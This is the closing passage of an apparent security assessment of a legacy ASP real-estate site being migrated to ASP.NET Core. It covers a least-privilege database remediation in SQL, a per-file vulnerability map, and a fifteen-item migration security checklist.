        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
    await next();
});
```

---

## 13. 🔵 LOW: Overly Broad Database Permissions

**Severity:** 🔵 LOW
**Affected File:** `includes/conn.asp`, line 4
**CWE:** CWE-250 (Execution with Unnecessary Privileges)

The application connects as `sa` (system administrator). Even without SQL injection, this violates the principle of least privilege. The application needs only `SELECT`, `INSERT`, `UPDATE`, `DELETE` on its own tables.

**ASP.NET Core Remediation:** Create a dedicated application database user with minimum required permissions:
```sql
CREATE LOGIN summitrealty_app WITH PASSWORD = '<strong-random-password>';
CREATE USER summitrealty_app FOR LOGIN summitrealty_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON SCHEMA::dbo TO summitrealty_app;
DENY EXECUTE TO summitrealty_app;  -- No stored proc execution
```

---

## Comprehensive Vulnerability Map by File

| File | SQLi | XSS | CSRF | IDOR | Auth Issue | Info Leak |
|------|:----:|:---:|:----:|:----:|:----------:|:---------:|
| `includes/conn.asp` | — | — | — | — | 🔴 SA creds | — |
| `includes/functions.asp` | — | — | — | — | — | 🔵 Unused sanitizer |
| `includes/auth.asp` | — | — | — | — | 🟡 No session regen | — |
| `includes/header.asp` | — | 🟠 | — | — | — | — |
| `includes/footer.asp` | — | — | — | — | — | 🟡 Server info |
| `global.asa` | — | — | — | — | 🟡 Session fixation | — |
| `admin/login.asp` | 🔴 | — | 🟠 | — | 🔴 Plain-text pwd | 🟡 Demo creds |
| `admin/users.asp` | 🔴 | 🟠 | 🟠 | — | 🔴 Pwd displayed | — |
| `admin/reports.asp` | — | 🟠 | — | — | — | — |
| `agents/dashboard.asp` | — | 🟠 | — | — | — | — |
| `agents/directory.asp` | — | 🟠 | — | — | — | — |
| `agents/profile.asp` | 🔴 | 🟠 | — | 🟠 | — | — |
| `listings/search.asp` | 🔴 | 🟠 | — | — | — | — |
| `listings/detail.asp` | 🔴 | 🟠 | 🟠 | 🟠 | — | — |
| `listings/add.asp` | 🔴 | — | 🟠 | — | — | — |
| `listings/edit.asp` | 🔴 | 🟠 | 🟠 | 🟠 | — | — |
| `listings/photos.asp` | 🔴 | 🟠 | 🟠 | 🟠 | — | 🟡 Upload vuln |
| `inquiries/contact.asp` | 🔴 | — | 🟠 | — | — | 🔴 SMTP creds |
| `inquiries/list.asp` | 🔴 | 🟠 | 🟠 | — | — | — |
| `inquiries/schedule.asp` | 🔴 | — | 🟠 | — | — | — |
| `database/schema.sql` | — | — | — | — | 🔴 Plain-text pwd | 🟡 Seed creds |

---

## ASP.NET Core Migration Security Checklist

When migrating to ASP.NET Core, ensure the following security controls are implemented:

| # | Control | Implementation |
|---|---------|---------------|
| 1 | **Parameterized Queries** | Use Entity Framework Core or Dapper with parameters. Never concatenate SQL. |
| 2 | **Password Hashing** | Use ASP.NET Core Identity (PBKDF2) or BCrypt. Never store plain text. |
| 3 | **Secrets Management** | Use Azure Key Vault, User Secrets, or environment variables. No hardcoded credentials. |
| 4 | **Output Encoding** | Razor auto-encodes. Use `@Html.Raw()` only when absolutely necessary. |
| 5 | **CSRF Tokens** | `[ValidateAntiForgeryToken]` on all POST actions. Built into Tag Helpers. |
| 6 | **Authorization** | Resource-based authorization. Verify ownership on every data access. |
| 7 | **Session Management** | Cookie auth with `HttpOnly`, `Secure`, `SameSite=Strict`. Session regen on login. |
| 8 | **HTTPS** | `UseHttpsRedirection()` + HSTS. Minimum TLS 1.2. |
| 9 | **Security Headers** | CSP, X-Frame-Options, X-Content-Type-Options via middleware. |
| 10 | **Input Validation** | Data annotations + FluentValidation. Validate on server side always. |
| 11 | **File Upload** | Validate type, size, scan for malware. Store outside webroot with random names. |
| 12 | **Error Handling** | Global exception handler. Never expose stack traces in production. |
| 13 | **Logging & Monitoring** | Structured logging (Serilog). Log auth events. Never log passwords. |
| 14 | **Least Privilege DB** | Dedicated app user with minimal permissions. Never use SA. |
| 15 | **Rate Limiting** | `AddRateLimiter()` on login and public form endpoints. |

---

*End of Security Assessment*
